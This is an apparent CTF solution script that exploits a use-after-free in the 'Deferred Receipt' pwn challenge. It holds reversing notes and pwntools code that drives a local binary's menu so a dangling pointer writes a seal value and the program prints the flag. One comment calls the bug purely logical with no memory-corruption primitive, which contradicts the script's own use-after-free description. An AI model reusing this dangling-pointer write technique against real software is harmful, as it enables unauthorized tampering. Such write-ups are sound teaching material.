"""
title: Deferred Receipt
ctf: WolvCTF 2026
category: pwn
difficulty: 3
arch: amd64
linking: static
mitigation_gaps: [no-canary]
vulnerabilities: [use-after-free]
tags: [arbitrary-write]
"""
from pwn import *
import re

# =====
# ANALYSIS
# =====
# Static-PIE with Full RELRO, so there is no memory-corruption primitive. The
# bug is purely logical, and the exploit is just a sequence of menu actions.
# The reversing below (done in Ghidra) explains why that sequence works.

# --- Data model (recovered by cross-referencing the global arrays) ---
# The program keeps 8 receipt slots described by parallel global arrays:
#   receipt_ids[8]    : int, the printed ID of the receipt in each slot
#   receipt_status[8] : int, 0 = empty, 1 = public, 2 = sealed
#   receipt_data[8]   : struct of 4 ints { id, seal_hi, seal_lo, seal_status }
# A sealed receipt can only be EXPORTED (and the flag printed) when its
# seal_status word equals 0x4C414553 == "SEAL". On creation seal_status is
# left at 0, so something has to write "SEAL" into it.

# --- The bug: a dangling amendment pointer ---
# A single-entry "amendment queue" defers a change to a PUBLIC receipt.
# Queuing (menu 2) records in .bss the slot's seal_status address (a raw
# POINTER into receipt_data) and the value to write there. Processing the
# queue (menu 5) writes that value through the stored pointer, then clears it.
# Cancelling a public receipt (menu 3) zeroes its slot and frees it for reuse,
# but DOES NOT clear a pending amendment still pointing at that slot. The
# queued pointer is now dangling. Creating a SEALED receipt reuses the very
# same slot, so the dangling pointer ends up aimed at the sealed receipt's
# seal_status, and processing the queue writes the chosen value into it.

# --- Plan ---
#   1. Create a public receipt            -> takes slot N
#   2. Queue an amendment of value "SEAL" -> stores &slot N .seal_status
#   3. Cancel the public receipt          -> frees slot N, queue dangles
#   4. Create a sealed receipt            -> reuses slot N
#   5. Process the queue                  -> writes "SEAL" into slot N seal_status
#   6. Export the sealed receipt          -> check passes, flag printed

# =====
# CONSTANTS
# =====
SEAL = 0x4C414553               # "SEAL", the seal_status value that unlocks export

# =====
# EXPLOIT
# =====

# Open the target and define a small menu-selection helper.
p = process("./deferred-receipt")


def choose(option):
    p.recvuntil(b"Choice: ")
    p.sendline(str(option).encode())


# 1. Create a public receipt, the program prints back the assigned ID.
choose(1)
p.recvuntil(b"Receipt ID: ")
public_id = int(p.recv(4))
print(f"{public_id=}")

# 2. Queue an amendment on that receipt with value "SEAL", recording a pointer
#    to the slot's seal_status word.
choose(2)
p.recvuntil(b"Public receipt ID: ")
p.sendline(str(public_id).encode())
p.recvuntil(b"Amendment (hex): ")
p.sendline(hex(SEAL).encode())

# 3. Cancel the public receipt, the slot is freed but the queued pointer is
#    left dangling at it.
choose(3)
p.recvuntil(b"Public receipt ID: ")
p.sendline(str(public_id).encode())

# 4. Create a sealed receipt, it reuses the freed slot so the dangling pointer
#    now targets its seal_status.
choose(4)
p.recvuntil(b"Receipt ID: ")
sealed_id = int(p.recv(4))
print(f"{sealed_id=}")

# 5. Process the queue, writing "SEAL" through the dangling pointer into the
#    sealed receipt's seal_status.
choose(5)

# 6. Export the now "sealed" receipt, the seal_status == "SEAL" check passes
#    and the flag is printed.
choose(6)
p.recvuntil(b"Sealed receipt ID: ")
p.sendline(str(sealed_id).encode())

# --- Flag ---

# Extract the flag from the program output.
output = p.recvall(timeout=5)
match = re.search(rb"wctf\{[^}]*\}", output)
if match:
    print(f"Found flag: {match.group(0).decode()}")
else:
    print("Flag not found in the output:")
    print(output.decode(errors="replace"))
